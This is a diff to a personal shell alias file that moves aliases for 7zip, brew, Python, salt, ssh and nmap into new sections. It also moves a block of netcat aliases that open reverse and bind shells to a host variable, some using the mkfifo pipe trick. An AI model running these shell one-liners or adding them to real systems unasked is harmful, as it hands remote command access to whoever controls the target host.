@@ -133,31 +133,12 @@ alias iptlistout='sudo /sbin/iptables -L OUTPUT -n -v --line-numbers'
 alias iptlistfw='sudo /sbin/iptables -L FORWARD -n -v --line-numbers'
 alias ls-size="ll -lAS && echo '-------------Smallest-----'"
 alias ls-time="ls -lAt && echo '-------------Oldest-----'"
-alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
-alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
-alias nc-trad-rev='nc -e /bin/bash $RHOST $RPORT'
-alias nc-trad-rev='nc -e /bin/bash -l $LPORT'
-alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f'
-alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $LPORT >/tmp/f'
-alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $RHOST $RPORT >/tmp/f'
-alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l $LPORT >/tmp/f'
 alias rsync-copy="rsync -avhP"
 alias wget-mirror-page="wget -p -k"
 
 ### User Definitions ###
-### 7zip ###
-alias 7z-extracthere="7z e "
-alias 7z-unarchive="7z x "
-alias 7z-cmax="7z a -t7z -m0=lzma -mx=9 "
-alias 7z-cextreme="7z a -t7z -m0=lzma -mx=9 -md=32m -ms=on "
 alias beep='echo -e "\a\c"'
 alias beep-lots='while :; do beep; sleep 1; done'
-### brew ### 
-alias brewa="arch -arm64 brew "
-alias brewai="arch -arm64 brew install"
-alias brewarm="arch -arm64 brew "
-alias brewarmi="arch -arm64 brew install"
-alias brewls="brew list"
 alias br="source ~/.bashrc"
 alias zr="source ~/.zshrc"
 ### cd ### 
@@ -170,14 +151,45 @@ alias most="du -hsx * | sort -rh | head -10"
 alias now='date +"%T"'
 alias nowtime="now"
 alias nowdate='date +"%d-%m-%Y"'
+#alias sort_dir_by_size="du -ha --max-depth=1 | sort -h"
+alias trim='awk '\''{$1=$1};1'\'''
+alias du-usage='du -ch | grep total'
+
+####################
+###   Software   ### 
+####################
+
+### 7zip ###
+alias 7z-extracthere="7z e "
+alias 7z-unarchive="7z x "
+alias 7z-cmax="7z a -t7z -m0=lzma -mx=9 "
+alias 7z-cextreme="7z a -t7z -m0=lzma -mx=9 -md=32m -ms=on "
+
+### brew ### 
+alias brewa="arch -arm64 brew "
+alias brewai="arch -arm64 brew install"
+alias brewarm="arch -arm64 brew "
+alias brewarmi="arch -arm64 brew install"
+alias brewls="brew list"
+
+### nc ### 
+alias nc-trad-rev='nc -e /bin/sh $RHOST $RPORT'
+alias nc-trad-bind='nc -e /bin/sh -l $LPORT'
+alias nc-trad-rev='nc -e /bin/bash $RHOST $RPORT'
+alias nc-trad-rev='nc -e /bin/bash -l $LPORT'
+alias nc-sh-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f'
+alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l $LPORT >/tmp/f'
+alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $RHOST $RPORT >/tmp/f'
+alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l $LPORT >/tmp/f'
+
 ### nmap ###
 alias nmap-quick='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -F -oA $RHOST"_nmap_quick"'
 alias nmap-full='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sS -p- -O -oA $RHOST"_nmap_full"'
 alias nmap-udp='sudo -E nmap $RHOST -vv -n --open --reason -sC -sV -sU --top-ports 20 -O -oA $RHOST"_nmap_udp"'
-alias serve2="python -m SimpleHTTPServer"
-alias serve3="python3 -m http.server"
+
 ### pip ###
 alias pipr="pip install -r requirements.txt"
+
 ### pyenv ###
 alias pyg="pyenv global"
 alias pyi27="pyenv install 2.7.18"
@@ -193,24 +205,24 @@ alias py-virt-new="pyenv virtualenv "
 alias py-virt-ls="pyenv virtualenvs"
 alias pywhich="pyenv which"
 alias pyw="pyenv which"
+
+### python ###
+alias serve2="python -m SimpleHTTPServer"
+alias serve3="python3 -m http.server"
+
 ### salt ###
 alias salt-alive="salt '*' test.ping"
 alias salt-applystate="salt '*' state.apply"
 alias salt-targetwindows="salt -C 'G@os:Windows' "
 alias salt-slowly="salt -b 1 --batch-wait 60 "
 alias salt-crawl="salt -b 1 --batch-wait 360 "
+
 ### ssh ###
+alias genkey="ssh-keygen -t rsa -b 4096"
+alias keytopub='ssh-keygen -y -f'
 alias fingerprint='ssh-keygen -lf'
-alias newkey='ssh-keygen -y -f'
 alias sshcpi='ssh-copy-id'
 alias cpkey='pbcopy < ~/.ssh/id_rsa.pub'
-#alias sort_dir_by_size="du -ha --max-depth=1 | sort -h"
-alias trim='awk '\''{$1=$1};1'\'''
-alias du-usage='du -ch | grep total'
-
-####################
-###   Software   ### 
-####################
 
 ### screen ###
 alias screen-attach="screen -Rd"
